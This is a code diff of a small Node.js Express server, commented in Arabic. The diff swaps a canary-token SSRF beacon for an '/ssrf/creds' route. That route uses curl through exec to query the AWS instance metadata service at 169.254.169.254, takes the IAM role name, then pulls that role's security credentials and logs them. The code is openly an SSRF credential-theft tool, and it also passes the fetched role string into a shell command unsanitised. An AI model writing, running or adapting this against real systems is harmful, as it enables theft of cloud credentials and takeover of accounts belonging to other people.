@@ -1,31 +1,44 @@
 const express = require("express");
 const { exec } = require("child_process");
 const app = express();
-
 const PORT = 10000;
 
-// توليد رابط canary جديد تلقائي (أنت بدّله بروابطك الجاهزة إذا تحب)
-function generateCanaryToken() {
-  // مثال: رابط redirect سريع من canarytokens
-  return "http://canarytokens.com/images/about/a57ijqi2n5uzs2o8y3h2oc8p6/contact.php";
+// خطوة 1: استخراج اسم الدور (IAM Role)
+function getIAMRole(callback) {
+  const cmd = `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`;
+  exec(cmd, (err, stdout) => {
+    if (err || !stdout.trim()) return callback(null);
+    callback(stdout.trim());
+  });
 }
 
-// كل مرة يولّد مسار عشوائي جديد
-app.get("/ssrf/:id", (req, res) => {
-  const tokenUrl = generateCanaryToken(); // غيره لو حبيت تجرب على metadata مثلاً
-
-  exec(`curl ${tokenUrl}`, (err, stdout, stderr) => {
-    if (err) {
-      console.error("Error executing curl:", err);
+// خطوة 2: استخراج الـ credentials باستخدام اسم الدور
+function getIAMCredentials(role) {
+  const credsURL = `http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`;
+  const cmd = `curl -s "${credsURL}"`;
+  exec(cmd, (err, stdout) => {
+    if (err || !stdout) {
+      console.error("❌ Failed to extract credentials");
     } else {
-      console.log(`✅ Curl fired to: ${tokenUrl}`);
+      console.log("✅ IAM Credentials:\n", stdout);
     }
   });
+}
 
-  res.send(`<h1>📡 SSRF Triggered for ID: ${req.params.id}</h1>`);
+// مسار SSRF trigger
+app.get("/ssrf/creds", (req, res) => {
+  getIAMRole((role) => {
+    if (!role) {
+      res.send("❌ Could not fetch IAM Role");
+      return;
+    }
+
+    console.log("🔐 IAM Role:", role);
+    getIAMCredentials(role);
+    res.send(`<h1>🧨 Trying to extract AWS credentials for role: ${role}</h1>`);
+  });
 });
 
-// تشغيل السيرفر
 app.listen(PORT, () => {
   console.log(`🔥 Server running at http://localhost:${PORT}`);
 });
